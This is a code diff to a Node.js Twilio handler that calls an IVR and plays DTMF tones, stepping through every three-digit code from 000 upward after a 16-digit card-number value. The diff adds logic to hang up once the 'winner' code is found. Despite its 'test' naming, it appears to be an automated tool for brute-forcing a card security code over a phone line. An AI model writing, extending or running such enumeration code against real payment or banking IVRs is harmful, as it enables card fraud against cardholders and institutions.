@@ -75,13 +75,33 @@ export const handleTryCode = async (req, res) => {
     return res.send(twiml.toString());
   }
 
-  // Get base card and target code for logging
-  const { data: attempt } = await supabase.from('attempts').select('test_value, target_test_code').eq('id', attemptId).single();
+  // Get base card, target code, status, and winner for checking completion
+  const { data: attempt } = await supabase
+    .from('attempts')
+    .select('test_value, target_test_code, status, result_details')
+    .eq('id', attemptId)
+    .single();
+
   let baseCard = '1234567890123456';
   let targetTestCode = null;
+  let winnerCode = null;
+
   if (attempt) {
     if (attempt.test_value) baseCard = attempt.test_value.split(':')[0];
     targetTestCode = attempt.target_test_code;
+    if (attempt.result_details && attempt.result_details.winner) {
+      winnerCode = attempt.result_details.winner;
+    }
+  }
+
+  // If call status is already completed/failed or winner is confirmed, stop immediately!
+  const isCompleted = attempt && (attempt.status === 'completed' || attempt.status === 'failed' || winnerCode);
+  if (isCompleted) {
+    console.log(`[handleTryCode] Attempt #${attemptId} is already ${attempt ? attempt.status : 'finished'} (Winner: ${winnerCode}). Hanging up call immediately.`);
+    const twiml = new twilio.twiml.VoiceResponse();
+    twiml.hangup();
+    res.type('text/xml');
+    return res.send(twiml.toString());
   }
 
   const twiml = new twilio.twiml.VoiceResponse();
@@ -91,6 +111,8 @@ export const handleTryCode = async (req, res) => {
 
   let lastCodeInBatch = '';
   const batchLogs = [];
+  const targetWinner = winnerCode || targetTestCode;
+  let reachedWinner = false;
 
   for (let i = currentCodeNum; i < endCodeNum; i++) {
     const codeStr = i.toString().padStart(3, '0');
@@ -104,9 +126,13 @@ export const handleTryCode = async (req, res) => {
     } else {
       batchLogs.push(`IVR says "Incorrect Test Code" for ${codeStr}. Trying next...`);
       batchLogs.push(`DTMF Sent: ${baseCard}:${codeStr}`);
-      // Pause briefly to let the test-IVR's Gather process the previous digit and set up the next one
       twiml.pause({ length: 2 });
       twiml.play({ digits: codeStr });
+    }
+
+    if (targetWinner && codeStr === targetWinner) {
+      reachedWinner = true;
+      break; // Stop adding more codes to TwiML once target code is reached!
     }
   }
 
@@ -115,12 +141,16 @@ export const handleTryCode = async (req, res) => {
   // Update the DB so the frontend shows the current Test code progressing
   await AttemptModel.updateTestValue(attemptId, `${baseCard}:${lastCodeInBatch}`);
 
-  const nextTestCode = endCodeNum.toString().padStart(3, '0');
-
-  // Give the IVR time to process the final guess
-  twiml.pause({ length: 1 });
-  const host = process.env.SERVER_URL || `${req.protocol}://${req.get('host')}`;
-  twiml.redirect({ method: 'POST' }, `${host}/api/call/try/${attemptId}?currentTestCode=${nextTestCode}&isFirst=false`);
+  if (reachedWinner) {
+    console.log(`[handleTryCode] Target winner code ${targetWinner} reached in TwiML. Hanging up call immediately.`);
+    twiml.pause({ length: 2 });
+    twiml.hangup(); // Stop immediately, do NOT redirect to next batch!
+  } else {
+    const nextTestCode = endCodeNum.toString().padStart(3, '0');
+    twiml.pause({ length: 1 });
+    const host = process.env.SERVER_URL || `${req.protocol}://${req.get('host')}`;
+    twiml.redirect({ method: 'POST' }, `${host}/api/call/try/${attemptId}?currentTestCode=${nextTestCode}&isFirst=false`);
+  }
 
   res.type('text/xml');
   return res.send(twiml.toString());
